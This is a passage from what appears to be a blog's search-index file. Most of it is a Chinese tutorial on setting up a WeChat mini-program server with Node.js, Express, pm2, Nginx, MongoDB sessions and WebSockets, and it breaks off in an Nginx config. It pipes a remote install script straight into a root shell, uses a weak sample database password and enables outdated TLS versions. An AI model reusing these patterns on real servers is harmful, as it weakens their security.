指模块内执行几个逻辑上相似的功能， 通过参数确定该模块完成哪一个功能。</p><p>时间内聚，把需要同时执行的动作组合在一起形成的模块。</p><p>通信内聚，指模块内所有处理元素都在同一个数据结构上操作，或者指各处理使用相同的输入数据或者产生相同的输出数据。</p><p>顺序内聚，指一个模块中各个处理元素都密切相关于同一功能且必须顺序执行，前一个功能元素的输出就是下一个功能元素的输入。</p><p>功能内聚， 是最强的内聚， 指模块内所有元素共同完成一个功能， 缺一不可。 是最佳的内聚类型。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>搭建微信小程序服务</title>
      <link href="/2018/04/11/%E6%90%AD%E5%BB%BA%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%9C%8D%E5%8A%A1/"/>
      <url>/2018/04/11/%E6%90%AD%E5%BB%BA%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<p>手把手搭建微信小程序服务。</p><span id="more"></span><p>1.安装 NodeJS 和 NPM</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl --silent --location https://rpm.nodesource.com/setup_8.x | sudo bash -</span><br><span class="line">yum install nodejs -y</span><br></pre></td></tr></table></figure><p>安装完成后查看安装是否成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure><p>2.创建并进入文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">mkdir</span> -p /data/release/weapp</span><br><span class="line">$ <span class="built_in">cd</span> /data/release/weapp</span><br></pre></td></tr></table></figure><p>3.新建package.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;weapp&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>4.添加 express 服务</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引用 express 来支持 HTTP Server 的实现</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个 express 实例</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现唯一的一个中间件，对于所有请求，都输出 &quot;Response from express&quot;</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">request, response, next</span>) =&gt;</span> &#123;</span><br><span class="line">    response.<span class="title function_">write</span>(<span class="string">&#x27;Response from express&#x27;</span>);</span><br><span class="line">    response.<span class="title function_">end</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听端口，等待连接</span></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8765</span>;</span><br><span class="line">app.<span class="title function_">listen</span>(port);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出服务器启动日志</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server listening at http://127.0.0.1:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br></pre></td></tr></table></figure><p>4.运行http<br>1)安装 pm2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install pm2 --global</span><br></pre></td></tr></table></figure><p>2)安装 express</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install express --save</span><br></pre></td></tr></table></figure><p>3)安装完成后，使用 PM2 来启动 HTTP 服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm2 start app.js</span><br></pre></td></tr></table></figure><p>pm2 常用命令</p><p>要查看服务输出的日志，可以使用下面的命令：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm2 logs</span><br></pre></td></tr></table></figure><p>如果要重启服务，可以使用下面的命令：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm2 restart app</span><br></pre></td></tr></table></figure><p>5.安装 Nginx<br>如果是 centOS，可以用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install nginx -y</span><br></pre></td></tr></table></figure><p>安装完成后启动nginx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx</span><br></pre></td></tr></table></figure><p>6.准备ssl证书，方法有很多种，现在有很多免费的ssl证书</p><p>7.ssl配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 443;</span><br><span class="line">        server_name www.example.com; # 改为绑定证书的域名</span><br><span class="line">        # ssl 配置</span><br><span class="line">        ssl on;</span><br><span class="line">        ssl_certificate 1_www.example.com_bundle.crt; # 改为自己申请得到的 crt 文件的名称</span><br><span class="line">        ssl_certificate_key 2_www.example.com.key; # 改为自己申请得到的 key 文件的名称</span><br><span class="line">        ssl_session_timeout 5m;</span><br><span class="line">        ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">        ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;</span><br><span class="line">        ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_pass http://127.0.0.1:8765;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>8.安装 mongoDB<br>以下是针对centOS的，其他方法之后补充。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install mongodb-server mongodb -y</span><br></pre></td></tr></table></figure><p>检查是否安装成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mongod --version</span><br><span class="line">mongo --version</span><br></pre></td></tr></table></figure><p>9.启动mongoDB<br>1)创建目录，用于 MongoDB 数据和日志存储</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /data/mongodb</span><br><span class="line"><span class="built_in">mkdir</span> -p /data/logs/mongodb</span><br></pre></td></tr></table></figure><p>2)启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongod --fork --dbpath /data/mongodb --logpath /data/logs/mongodb/weapp.log</span><br></pre></td></tr></table></figure><p>(MongoDB 首次启动可能会花费大概 1min 时间，请耐心等待)</p><p>3)检查是否启动成功<br>(MongoDB 默认监听 27017 端口等待连接，下面的命令查看当前 27017 端口被哪个进程占用，如果是 MongoDB 的进程，则表示启动成功。)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ltp | grep 27017</span><br></pre></td></tr></table></figure><p>10.添加 MongoDB 用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ mongo</span><br><span class="line"></span><br><span class="line">&gt; use weapp;</span><br><span class="line">&gt; db.createUser(&#123; user: <span class="string">&#x27;weapp&#x27;</span>, <span class="built_in">pwd</span>: <span class="string">&#x27;weapp-dev&#x27;</span>, roles: [<span class="string">&#x27;dbAdmin&#x27;</span>, <span class="string">&#x27;readWrite&#x27;</span>]&#125;);</span><br></pre></td></tr></table></figure><p>mongo2.x 的时候用db.addUser()</p><p>创建完之后，<code>exit</code> 退出</p><p>11.安装 Node 模块<br>实现小程序的会话功能，我们需要安装 connect-mongo 和 wafer-node-session</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /data/release/weapp</span><br><span class="line">npm install connect-mongo wafer-node-session </span><br></pre></td></tr></table></figure><p>12.实现小程序会话<br>1)在工作目录<code>weapp</code>创建配置文件 <code>config.js</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">module.exports = &#123; </span><br><span class="line">    serverPort: <span class="string">&#x27;8765&#x27;</span>, </span><br><span class="line"></span><br><span class="line">    // 小程序 appId 和 appSecret </span><br><span class="line">    // 请到 https://mp.weixin.qq.com 获取 AppID 和 AppSecret</span><br><span class="line">    appId: <span class="string">&#x27;YORU_APP_ID&#x27;</span>, </span><br><span class="line">    appSecret: <span class="string">&#x27;YOUR_APP_SECRET&#x27;</span>, </span><br><span class="line"></span><br><span class="line">    // mongodb 连接配置，生产环境请使用更复杂的用户名密码</span><br><span class="line">    mongoHost: <span class="string">&#x27;127.0.0.1&#x27;</span>, </span><br><span class="line">    mongoPort: <span class="string">&#x27;27017&#x27;</span>, </span><br><span class="line">    mongoUser: <span class="string">&#x27;weapp&#x27;</span>, </span><br><span class="line">    mongoPass: <span class="string">&#x27;weapp-dev&#x27;</span>, </span><br><span class="line">    mongoDb: <span class="string">&#x27;weapp&#x27;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>2)修改 app.js，添加会话实现逻辑</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引用 express 来支持 HTTP Server 的实现</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="comment">// 引用 wafer-session 支持小程序会话</span></span><br><span class="line"><span class="keyword">const</span> waferSession = <span class="built_in">require</span>(<span class="string">&#x27;wafer-node-session&#x27;</span>); </span><br><span class="line"><span class="comment">// 使用 MongoDB 作为会话的存储</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">MongoStore</span> = <span class="built_in">require</span>(<span class="string">&#x27;connect-mongo&#x27;</span>)(waferSession); </span><br><span class="line"><span class="comment">// 引入配置文件</span></span><br><span class="line"><span class="keyword">const</span> config = <span class="built_in">require</span>(<span class="string">&#x27;./config&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个 express 实例</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加会话中间件，登录地址是 /login</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">waferSession</span>(&#123; </span><br><span class="line">    <span class="attr">appId</span>: config.<span class="property">appId</span>, </span><br><span class="line">    <span class="attr">appSecret</span>: config.<span class="property">appSecret</span>, </span><br><span class="line">    <span class="attr">loginPath</span>: <span class="string">&#x27;/login&#x27;</span>,</span><br><span class="line">    <span class="attr">store</span>: <span class="keyword">new</span> <span class="title class_">MongoStore</span>(&#123; </span><br><span class="line">        <span class="attr">url</span>: <span class="string">`mongodb://<span class="subst">$&#123;config.mongoUser&#125;</span>:<span class="subst">$&#123;config.mongoPass&#125;</span>@<span class="subst">$&#123;config.mongoHost&#125;</span>:<span class="subst">$&#123;config.mongoPort&#125;</span>/<span class="subst">$&#123;config.mongoDb&#125;</span>`</span> </span><br><span class="line">    &#125;) </span><br><span class="line">&#125;)); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 在路由 /me 下，输出会话里包含的用户信息</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/me&#x27;</span>, <span class="function">(<span class="params">request, response, next</span>) =&gt;</span> &#123; </span><br><span class="line">    response.<span class="title function_">json</span>(request.<span class="property">session</span> ? request.<span class="property">session</span>.<span class="property">userInfo</span> : &#123; <span class="attr">noBody</span>: <span class="literal">true</span> &#125;); </span><br><span class="line">    <span class="keyword">if</span> (request.<span class="property">session</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Wafer session success with openId=<span class="subst">$&#123;request.session.userInfo.openId&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现一个中间件，对于未处理的请求，都输出 &quot;Response from express&quot;</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">request, response, next</span>) =&gt;</span> &#123;</span><br><span class="line">    response.<span class="title function_">write</span>(<span class="string">&#x27;Response from express&#x27;</span>);</span><br><span class="line">    response.<span class="title function_">end</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听端口，等待连接</span></span><br><span class="line">app.<span class="title function_">listen</span>(config.<span class="property">serverPort</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出服务器启动日志</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server listening at http://127.0.0.1:<span class="subst">$&#123;config.serverPort&#125;</span>`</span>);</span><br></pre></td></tr></table></figure><p>3)重启 <code>pm2</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm2 restart app</span><br></pre></td></tr></table></figure><p>13.WebSocket 服务<br>1)安装 Node 模块<br>使用 ws 模块来在服务器上支持 WebSocket 协议，下面使用 NPM 来安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /data/release/weapp</span><br><span class="line">npm install ws --save</span><br></pre></td></tr></table></figure><p>2)创建 websocket.js，实现 WebSocket 服务，可参考下面的代码：<br><code>websocket.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入 ws 支持 WebSocket 的实现</span></span><br><span class="line"><span class="keyword">const</span> ws = <span class="built_in">require</span>(<span class="string">&#x27;ws&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导出处理方法</span></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">listen</span> = listen;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在 HTTP Server 上处理 WebSocket 请求</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">http.Server</span>&#125; <span class="variable">server</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">wafer.SessionMiddleware</span>&#125; <span class="variable">sessionMiddleware</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">listen</span>(<span class="params">server, sessionMiddleware</span>) &#123;</span><br><span class="line">    <span class="comment">// 使用 HTTP Server 创建 WebSocket 服务，使用 path 参数指定需要升级为 WebSocket 的路径</span></span><br><span class="line">    <span class="keyword">const</span> wss = <span class="keyword">new</span> ws.<span class="title class_">Server</span>(&#123; server, <span class="attr">path</span>: <span class="string">&#x27;/ws&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听 WebSocket 连接建立</span></span><br><span class="line">    wss.<span class="title function_">on</span>(<span class="string">&#x27;connection&#x27;</span>, <span class="function">(<span class="params">ws,request</span>) =&gt;</span> &#123;<span class="comment">// 要升级到 WebSocket 协议的 HTTP 连接</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 被升级到 WebSocket 的请求不会被 express 处理，</span></span><br><span class="line">        <span class="comment">// 需要使用会话中间节获取会话</span></span><br><span class="line">        <span class="title function_">sessionMiddleware</span>(request, <span class="literal">null</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> session = request.<span class="property">session</span>;</span><br><span class="line">            <span class="keyword">if</span> (!session) &#123;</span><br><span class="line">                <span class="comment">// 没有获取到会话，强制断开 WebSocket 连接</span></span><br><span class="line">                ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(request.<span class="property">sessionError</span>) || <span class="string">&quot;No session avaliable&quot;</span>);</span><br><span class="line">                ws.<span class="title function_">close</span>();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 保留这个日志的输出可让实验室能检查到当前步骤是否完成</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`WebSocket client connected with openId=<span class="subst">$&#123;session.userInfo.openId&#125;</span>`</span>);</span><br><span class="line">            <span class="title function_">serveMessage</span>(ws, session.<span class="property">userInfo</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听 WebSocket 服务的错误</span></span><br><span class="line">    wss.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 进行简单的 WebSocket 服务，对于客户端发来的所有消息都回复回去</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">serveMessage</span>(<span class="params">ws, userInfo</span>) &#123;</span><br><span class="line">    <span class="comment">// 监听客户端发来的消息</span></span><br><span class="line">    ws.<span class="title function_">on</span>(<span class="string">&#x27;message&#x27;</span>, <span class="function">(<span class="params">message</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`WebSocket received: <span class="subst">$&#123;message&#125;</span>`</span>);</span><br><span class="line">        ws.<span class="title function_">send</span>(<span class="string">`Server: Received(<span class="subst">$&#123;message&#125;</span>)`</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听关闭事件</span></span><br><span class="line">    ws.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">(<span class="params">code, message</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`WebSocket client closed (code: <span class="subst">$&#123;code&#125;</span>, message: <span class="subst">$&#123;message || <span class="string">&#x27;none&#x27;</span>&#125;</span>)`</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接后马上发送 hello 消息给会话对应的用户</span></span><br><span class="line">    ws.<span class="title function_">send</span>(<span class="string">`Server: 恭喜，<span class="subst">$&#123;userInfo.nickName&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改 <code>app.js</code> ,调用 WebSocket 服务，可参考下面代码:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTTP 模块同时支持 Express 和 WebSocket</span></span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>); </span><br><span class="line"><span class="comment">// 引用 express 来支持 HTTP Server 的实现</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="comment">// 引用 wafer-session 支持小程序会话</span></span><br><span class="line"><span class="keyword">const</span> waferSession = <span class="built_in">require</span>(<span class="string">&#x27;wafer-node-session&#x27;</span>); </span><br><span class="line"><span class="comment">// 使用 MongoDB 作为会话的存储</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">MongoStore</span> = <span class="built_in">require</span>(<span class="string">&#x27;connect-mongo&#x27;</span>)(waferSession); </span><br><span class="line"><span class="comment">// 引入配置文件</span></span><br><span class="line"><span class="keyword">const</span> config = <span class="built_in">require</span>(<span class="string">&#x27;./config&#x27;</span>); </span><br><span class="line"><span class="comment">// 引入 WebSocket 服务实现</span></span><br><span class="line"><span class="keyword">const</span> websocket = <span class="built_in">require</span>(<span class="string">&#x27;./websocket&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个 express 实例</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 独立出会话中间件给 express 和 ws 使用</span></span><br><span class="line"><span class="keyword">const</span> sessionMiddleware = <span class="title function_">waferSession</span>(&#123;</span><br><span class="line">    <span class="attr">appId</span>: config.<span class="property">appId</span>,</span><br><span class="line">    <span class="attr">appSecret</span>: config.<span class="property">appSecret</span>,</span><br><span class="line">    <span class="attr">loginPath</span>: <span class="string">&#x27;/login&#x27;</span>,</span><br><span class="line">    <span class="attr">store</span>: <span class="keyword">new</span> <span class="title class_">MongoStore</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="string">`mongodb://<span class="subst">$&#123;config.mongoUser&#125;</span>:<span class="subst">$&#123;config.mongoPass&#125;</span>@<span class="subst">$&#123;config.mongoHost&#125;</span>:<span class="subst">$&#123;config.mongoPort&#125;</span>/<span class="subst">$&#123;config.mongoDb&#125;</span>`</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">use</span>(sessionMiddleware);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在路由 /me 下，输出会话里包含的用户信息</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/me&#x27;</span>, <span class="function">(<span class="params">request, response, next</span>) =&gt;</span> &#123; </span><br><span class="line">    response.<span class="title function_">json</span>(request.<span class="property">session</span> ? request.<span class="property">session</span>.<span class="property">userInfo</span> : &#123; <span class="attr">noBody</span>: <span class="literal">true</span> &#125;); </span><br><span class="line">    <span class="keyword">if</span> (request.<span class="property">session</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Wafer session success with openId=<span class="subst">$&#123;request.session.userInfo.openId&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现一个中间件，对于未处理的请求，都输出 &quot;Response from express&quot;</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">request, response, next</span>) =&gt;</span> &#123;</span><br><span class="line">    response.<span class="title function_">write</span>(<span class="string">&#x27;Response from express&#x27;</span>);</span><br><span class="line">    response.<span class="title function_">end</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 HTTP Server 而不是直接使用 express 监听</span></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>(app);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 让 WebSocket 服务在创建的 HTTP 服务器上监听</span></span><br><span class="line">websocket.<span class="title function_">listen</span>(server, sessionMiddleware);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动 HTTP 服务</span></span><br><span class="line">server.<span class="title function_">listen</span>(config.<span class="property">serverPort</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出服务器启动日志</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server listening at http://127.0.0.1:<span class="subst">$&#123;config.serverPort&#125;</span>`</span>);</span><br></pre></td></tr></table></figure><p>修改完成后，按 Ctrl + S 保存文件，并重启服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm2 restart app</span><br></pre></td></tr></table></figure><p>3)更新 Nginx 代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># WebSocket 配置</span><br><span class="line">map $http_upgrade $connection_upgrade &#123;</span><br><span class="line">    default upgrade;</span><br><span class="line">    &#x27;&#x27;      close;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        listen 443;</span><br><span class="line">        